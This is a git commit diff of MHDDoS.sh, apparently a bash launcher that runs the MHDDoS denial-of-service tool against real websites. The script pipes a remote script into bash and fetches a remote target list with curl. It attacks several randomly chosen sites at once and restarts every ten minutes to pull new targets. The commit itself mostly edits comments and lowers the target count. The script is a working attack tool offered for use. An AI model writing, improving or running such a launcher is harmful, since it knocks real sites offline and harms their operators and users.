a56722dcac9e69889e0b51f38d98361e66223e3c
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-13 10:53:06 +0200

    Update MHDDoS.sh

--- MHDDoS.sh
+++ MHDDoS.sh
@@ -3,14 +3,13 @@
 #  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash   <<<<<
 ##### To kill script press CTRL+C several times.
 
-
 ## Restart script every N seconds (600s = 10m).
 ## It allows to download MHDDoS updates and target list updates.
-## Also for some reaseon MHDDoS crashes quite often, so restart eliminates that problem.
+## Also for some reaseon MHDDoS crashes quite often, so scheduled restarts eliminates that problem.
 restart_interval=600
 
-## Number of sites to attack simultaneously. Choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
-num_of_targets=4
+## Number of sites to attack simultaneously. Sites choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
+num_of_targets=2
 
 # Install git if it doesn't installed already
 if [ ! -f /usr/bin/git ]; then
@@ -31,7 +30,7 @@ do
 
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
-   # Get list of random numbers
+   # Create list with random numbers
    random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
    echo -e "random numbers: " $random_numbers "\n"
    
@@ -49,7 +48,7 @@ do
    # Launch multiple MHDDoS instances. Targets choosed based on previosly generated list of random numbers.
    for i in $random_numbers
    do
-            # Get one line from targets list
+            # Get pre-random line from targets list
             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
             
             # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
@@ -61,5 +60,5 @@ do
             python3 ~/MHDDoS/start.py $cmd_line
    done
 sleep $restart_interval
- pkill -f start.py
+pkill -f start.py
 done
